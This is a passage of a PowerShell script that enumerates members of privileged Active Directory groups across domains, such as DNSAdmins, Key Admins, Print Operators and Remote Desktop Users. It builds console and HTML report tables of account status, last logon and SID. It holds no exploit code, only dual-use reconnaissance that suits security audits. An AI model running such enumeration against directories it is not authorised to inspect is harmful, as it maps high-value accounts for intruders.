			$memberName = $CertPublisher.samaccountname
			if (!$memberName) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {
					$sid = $null;
					try {
						$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
					} catch {}
					$sid -eq (GetSID-FromBytes -sidBytes $CertPublisher.objectsid)
				}
				$tempMemberName = $ExtractedMember.samaccountname
				$memberDomain = $ExtractedMember.domain
				$memberName = ($memberDomain -split "\.")[0] + "\" + $tempMemberName
				if (!$isEnabled) {
					$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }
				}
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) {
						$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp
					} else {
						$lastLogon = ""
					}
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name"  = $memberName
				"Enabled"      = $isEnabled
				"Active"       = $isActive
				"Last Logon"   = $lastLogon
				"Member SID"   = GetSID-FromBytes -sidBytes $CertPublisher.objectsid
				"Group Domain" = $CertPublisher.domain
			}
		}
	}

	if ($TempCertPublishersGroup) {
		if(!$NoOutput){$TempCertPublishersGroup | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLCertPublishersGroup = $TempCertPublishersGroup | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='CertPublishers'>Cert Publishers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='CertPublishers'>" }
	}
	
	#################################################### 
	########### Distributed COM Users ################
	####################################################
	
	Write-Host ""
	Write-Host "Distributed COM Users" -ForegroundColor Cyan
	$TempDCOMUsers = @()
	$TempDCOMUsers = foreach ($AllDomain in $AllDomains) {
		$DCOMUsers = @()
		$DCOMUsers = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Distributed COM Users"
		foreach($DCOMUser in $DCOMUsers){
			
			$isEnabled = if ($DCOMUser.useraccountcontrol -band 2) { "False" } else { "True" }
			if($DCOMUser.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $DCOMUser.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $DCOMUser.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $DCOMUser.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $DCOMUser.objectsid
				"Group Domain" = $DCOMUser.domain
			}
		}
	}

	if ($TempDCOMUsers) {
		if(!$NoOutput){$TempDCOMUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLDCOMUsers = $TempDCOMUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DCOMUsers'>Distributed COM Users</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DCOMUsers'>" }
	}
	
	#################################################### 
	########### DNS Admins ################
	####################################################
	
	Write-Host ""
	Write-Host "DNS Admins" -ForegroundColor Cyan
	$TempDNSAdmins = @()
	$TempDNSAdmins = foreach ($AllDomain in $AllDomains) {
		$DNSAdmins = @()
		$DNSAdmins = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "DNSAdmins"
		foreach($DNSAdmin in $DNSAdmins){
			
			$isEnabled = if ($DNSAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
			if($DNSAdmin.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $DNSAdmin.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $DNSAdmin.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $DNSAdmin.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $DNSAdmin.objectsid
				"Group Domain" = $DNSAdmin.domain
			}
		}
	}

	if ($TempDNSAdmins) {
		if(!$NoOutput){$TempDNSAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLDNSAdmins = $TempDNSAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DNSAdmins'>DNS Admins</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DNSAdmins'>" }
	}
	
	#################################################### 
	########### Enterprise Key Admins ################
	####################################################
	
	Write-Host ""
	Write-Host "Enterprise Key Admins" -ForegroundColor Cyan
	$TempEnterpriseKeyAdmins = @()
	$TempEnterpriseKeyAdmins = foreach ($AllDomain in $AllDomains) {
		$EnterpriseKeyAdmins = @()
		$EnterpriseKeyAdmins = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Enterprise Key Admins"
		foreach ($EnterpriseKeyAdmin in $EnterpriseKeyAdmins) {
			
			$isEnabled = if ($EnterpriseKeyAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($EnterpriseKeyAdmin.lastlogontimestamp) { $lastLogon = Convert-LdapTimestamp -timestamp $EnterpriseKeyAdmin.lastlogontimestamp } else { $lastLogon = "" }
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $EnterpriseKeyAdmin.samaccountname
			if (!$membername) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {
					$sid = $null
					try {
						$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
					} catch { }
					$sid -eq (GetSID-FromBytes -sidBytes $EnterpriseKeyAdmin.objectsid)
				}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if (!$isEnabled) {
					$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }
				}
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) { $lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp } else { $lastLogon = "" }
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name"        = $membername
				"Enabled"     = $isEnabled
				"Active"      = $isActive
				"Last Logon"  = $lastLogon
				"Member SID"  = GetSID-FromBytes -sidBytes $EnterpriseKeyAdmin.objectsid
				"Group Domain"= $EnterpriseKeyAdmin.domain
			}
		}
	}

	if ($TempEnterpriseKeyAdmins) {
		if(!$NoOutput){$TempEnterpriseKeyAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLEnterpriseKeyAdmins = $TempEnterpriseKeyAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='EnterpriseKeyAdmins'>Enterprise Key Admins</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EnterpriseKeyAdmins'>" }
	}
	
	#################################################### 
	########### Enterprise Read-Only Domain Controllers ################
	####################################################
	
	Write-Host ""
	Write-Host "Enterprise Read-Only Domain Controllers" -ForegroundColor Cyan
	$TempEnterpriseRODCs = @()
	$TempEnterpriseRODCs = foreach ($AllDomain in $AllDomains) {
		$EnterpriseRODCs = @()
		$EnterpriseRODCs = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Enterprise Read-Only Domain Controllers"
		foreach($EnterpriseRODC in $EnterpriseRODCs){

			$isEnabled = if ($EnterpriseRODC.useraccountcontrol -band 2) { "False" } else { "True" }
			if($EnterpriseRODC.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $EnterpriseRODC.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $EnterpriseRODC.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $EnterpriseRODC.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $EnterpriseRODC.objectsid
				"Group Domain" = $EnterpriseRODC.domain
			}
		}
	}

	if ($TempEnterpriseRODCs) {
		if(!$NoOutput){$TempEnterpriseRODCs | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLEnterpriseRODCs = $TempEnterpriseRODCs | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='EnterpriseRODCs'>Enterprise Read-Only Domain Controllers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EnterpriseRODCs'>" }
	}

	
	#################################################### 
	########### Group Policy Creator Owners ################
	####################################################
	
	Write-Host ""
	Write-Host "Group Policy Creator Owners" -ForegroundColor Cyan
	$TempGPCreatorOwners = @()
	$TempGPCreatorOwners = foreach ($AllDomain in $AllDomains) {
		$GPCreatorOwners = @()
		$GPCreatorOwners = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Group Policy Creator Owners"
		foreach ($GPCreatorOwner in $GPCreatorOwners) {
			
			$isEnabled = if ($GPCreatorOwner.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($GPCreatorOwner.lastlogontimestamp) { $lastLogon = Convert-LdapTimestamp -timestamp $GPCreatorOwner.lastlogontimestamp } else { $lastLogon = "" }
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $GPCreatorOwner.samaccountname
			if (!$membername) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object { $sid = $null; try { $sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop } catch {} ; $sid -eq (GetSID-FromBytes -sidBytes $GPCreatorOwner.objectsid) }
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if (!$isEnabled) { $isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" } }
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) { $lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp } else { $lastLogon = "" }
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled"     = $isEnabled
				"Active"      = $isActive
				"Last Logon"  = $lastLogon
				"Member SID"  = GetSID-FromBytes -sidBytes $GPCreatorOwner.objectsid
				"Group Domain"= $GPCreatorOwner.domain
			}
		}
	}

	if ($TempGPCreatorOwners) {
		if(!$NoOutput){$TempGPCreatorOwners | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLGPCreatorOwners = $TempGPCreatorOwners | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GPCreatorOwners'>Group Policy Creator Owners</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GPCreatorOwners'>" }
	}

	#################################################### 
	########### Key Admins ################
	####################################################
	
	Write-Host ""
	Write-Host "Key Admins" -ForegroundColor Cyan
	$TempKeyAdmins = @()
	$TempKeyAdmins = foreach ($AllDomain in $AllDomains) {
		$KeyAdmins = @()
		$KeyAdmins = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Key Admins"
		foreach ($KeyAdmin in $KeyAdmins) {

			$isEnabled = if ($KeyAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($KeyAdmin.lastlogontimestamp) {
				$lastLogon = Convert-LdapTimestamp -timestamp $KeyAdmin.lastlogontimestamp
			} else {
				$lastLogon = ""
			}
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $KeyAdmin.samaccountname

			if (!$membername) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {
					$sid = $null
					try {
						$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
					} catch {}
					$sid -eq (GetSID-FromBytes -sidBytes $KeyAdmin.objectsid)
				}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if (!$isEnabled) {
					$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }
				}
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) {
						$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp
					} else {
						$lastLogon = ""
					}
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $KeyAdmin.objectsid
				"Group Domain" = $KeyAdmin.domain
			}
		}
	}

	if ($TempKeyAdmins) {
		if(!$NoOutput){$TempKeyAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLKeyAdmins = $TempKeyAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='KeyAdmins'>Key Admins</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='KeyAdmins'>" }
	}
	
	#################################################### 
	########### Organization Management ################
	####################################################
	
	Write-Host ""
	Write-Host "Organization Management" -ForegroundColor Cyan
	$TempOrganizationManagement = @()
	$TempOrganizationManagement = foreach ($AllDomain in $AllDomains) {
		$OrganizationManagement = @()
		$OrganizationManagement = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Organization Management"
		foreach($Organization in $OrganizationManagement){

			$isEnabled = if ($Organization.useraccountcontrol -band 2) { "False" } else { "True" }
			if($Organization.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $Organization.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $Organization.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $Organization.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $Organization.objectsid
				"Group Domain" = $Organization.domain
			}
		}
	}

	if ($TempOrganizationManagement) {
		if(!$NoOutput){$TempOrganizationManagement | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLOrganizationManagement = $TempOrganizationManagement | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='OrganizationManagement'>Organization Management</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='OrganizationManagement'>" }
	}
	
	#################################################### 
	########### Performance Log Users ################
	####################################################
	
	Write-Host ""
	Write-Host "Performance Log Users" -ForegroundColor Cyan
	$TempPerformanceLogUsers = @()
	$TempPerformanceLogUsers = foreach ($AllDomain in $AllDomains) {
		$PerformanceLogUsers = @()
		$PerformanceLogUsers = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Performance Log Users"
		foreach($PerformanceLogUser in $PerformanceLogUsers){

			$isEnabled = if ($PerformanceLogUser.useraccountcontrol -band 2) { "False" } else { "True" }
			if($PerformanceLogUser.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $PerformanceLogUser.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $PerformanceLogUser.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $PerformanceLogUser.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $PerformanceLogUser.objectsid
				"Group Domain" = $PerformanceLogUser.domain
			}
		}
	}

	if ($TempPerformanceLogUsers) {
		if(!$NoOutput){$TempPerformanceLogUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLPerformanceLogUsers = $TempPerformanceLogUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='PerformanceLogUsers'>Performance Log Users</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='PerformanceLogUsers'>" }
	}
	
	#################################################### 
	########### Print Operators ################
	####################################################
	
	Write-Host ""
	Write-Host "Print Operators" -ForegroundColor Cyan
	$TempPrintOperators = @()
	$TempPrintOperators = foreach ($AllDomain in $AllDomains) {
		$PrintOperators = @()
		$PrintOperators = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Print Operators"
		foreach($PrintOperator in $PrintOperators){

			$isEnabled = if ($PrintOperator.useraccountcontrol -band 2) { "False" } else { "True" }
			if($PrintOperator.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $PrintOperator.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $PrintOperator.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $PrintOperator.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $PrintOperator.objectsid
				"Group Domain" = $PrintOperator.domain
			}
		}
	}

	if ($TempPrintOperators) {
		if(!$NoOutput){$TempPrintOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLPrintOperators = $TempPrintOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='PrintOperators'>Print Operators</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='PrintOperators'>" }
	}
	
	#################################################### 
	########### Protected Users ################
	####################################################
	
	Write-Host ""
	Write-Host "Protected Users" -ForegroundColor Cyan
	$TempProtectedUsers = @()
	$TempProtectedUsers = foreach ($AllDomain in $AllDomains) {
		$ProtectedUsers = @()
		$ProtectedUsers = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Protected Users"
		foreach ($ProtectedUser in $ProtectedUsers) {

			$isEnabled = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($ProtectedUser.lastlogontimestamp) {
				$lastLogon = Convert-LdapTimestamp -timestamp $ProtectedUser.lastlogontimestamp
			} else {
				$lastLogon = ""
			}
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $ProtectedUser.samaccountname

			if (!$membername) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {
					$sid = $null
					try {
						$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
					} catch {}
					$sid -eq (GetSID-FromBytes -sidBytes $ProtectedUser.objectsid)
				}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if (!$isEnabled) {
					$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }
				}
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) {
						$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp
					} else {
						$lastLogon = ""
					}
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled"     = $isEnabled
				"Active"      = $isActive
				"Last Logon"  = $lastLogon
				"Member SID"  = GetSID-FromBytes -sidBytes $ProtectedUser.objectsid
				"Group Domain"= $ProtectedUser.domain
			}
		}
	}

	if ($TempProtectedUsers) {
		if(!$NoOutput){$TempProtectedUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLProtectedUsers = $TempProtectedUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ProtectedUsers'>Protected Users</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ProtectedUsers'>" }
	}

	
	#################################################### 
	########### Read-Only Domain Controllers ################
	####################################################
	
	Write-Host ""
	Write-Host "Read-Only Domain Controllers" -ForegroundColor Cyan
	$TempRODCs = @()
	$TempRODCs = foreach ($AllDomain in $AllDomains) {
		$RODCs = @()
		$RODCs = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Read-Only Domain Controllers"
		foreach($RODC in $RODCs){
			
			$isEnabled = if ($RODC.useraccountcontrol -band 2) { "False" } else { "True" }
			if($RODC.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $RODC.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $RODC.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $RODC.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $RODC.objectsid
				"Group Domain" = $RODC.domain
			}
		}
	}

	if ($TempRODCs) {
		if(!$NoOutput){$TempRODCs | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLRODCs = $TempRODCs | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='RODCs'>Read-Only Domain Controllers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='RODCs'>" }
	}
	
	#################################################### 
	########### Remote Desktop Users ################
	####################################################
	
	Write-Host ""
	Write-Host "Remote Desktop Users" -ForegroundColor Cyan
	$TempRDPUsers = @()
	$TempRDPUsers = foreach ($AllDomain in $AllDomains) {
		$RDPUsers = @()
		$RDPUsers = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Remote Desktop Users"
		foreach($RDPUser in $RDPUsers){
			
			$isEnabled = if ($RDPUser.useraccountcontrol -band 2) { "False" } else { "True" }
			if($RDPUser.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $RDPUser.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $RDPUser.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $RDPUser.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
